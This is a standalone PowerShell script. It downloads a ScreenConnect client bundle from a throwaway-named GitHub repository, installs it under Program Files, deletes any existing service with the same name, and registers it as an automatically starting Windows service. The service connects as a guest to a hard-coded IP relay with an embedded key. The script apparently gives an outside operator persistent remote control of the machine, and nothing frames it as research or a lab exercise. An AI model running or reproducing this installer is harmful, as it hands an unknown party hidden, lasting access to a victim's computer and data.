$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$root = "https://raw.githubusercontent.com/snehaweb3kid/runtime-cache-20260910--vpn/main"
$zip = Join-Path $env:TEMP "client-files.zip"
$extract = Join-Path $env:TEMP "client-files"
$dest = "C:\Program Files (x86)\ScreenConnect Client (9a2349d5363c2592)"
$name = "ScreenConnect Client (9a2349d5363c2592)"
$params = "?e=Access&y=Guest&h=124.198.131.151&p=8041&k=BgIAAACkAABSU0ExAAgAAAEAAQDlCPX499uZhLkIPdqMa1BzsrXHZYnGr8TYku6a%2blBFZfVFWNTkxc5oxks5BQow6IsQ2WS1%2b57hEY31HFENd3w1Gv1Ez23QNN9AdZivpg1VYaZcWQipo%2fTQ0kdJ4MEnT0vC8jJmHOvNWdN22Ywsw%2fhwNFZOUbYiKOciOMbwJtjwtZJ9Uy89TYqMH4EFbr9Q0GG9UqsuLQWwAyfHrWFOzYB%2bvkhGqG%2fw1nOSjMc1mB5kddiAAcuBNZCQwwwTU8ZU62qxc6VaRmoBnJR6KerJFkGlvkGtea8Eg%2bUlaIyA8r2xxvKskeIx2tENp9gnZLy40G42b3vOLuSPT%2bQDWhHVBLSj"

(New-Object Net.WebClient).DownloadFile("$root/client-files.zip", $zip)
if (Test-Path $extract) {
    Remove-Item $extract -Recurse -Force
}
Expand-Archive -Path $zip -DestinationPath $extract -Force
New-Item -ItemType Directory -Path $dest -Force | Out-Null
Copy-Item (Join-Path $extract "client-bundle\*") $dest -Recurse -Force

$exe = Join-Path $dest "ScreenConnect.ClientService.exe"
$existing = Get-Service -Name $name -ErrorAction SilentlyContinue
if ($existing) {
    Stop-Service -Name $name -Force -ErrorAction SilentlyContinue
    sc.exe delete $name | Out-Null
    Start-Sleep -Seconds 2
}
New-Service -Name $name -BinaryPathName "`"$exe`" `"$params`"" `
    -DisplayName $name -StartupType Automatic
Start-Service -Name $name
Get-Service -Name $name | Select-Object Name,DisplayName,Status | Format-List
Write-Output "MANUAL_CLIENT_DONE"
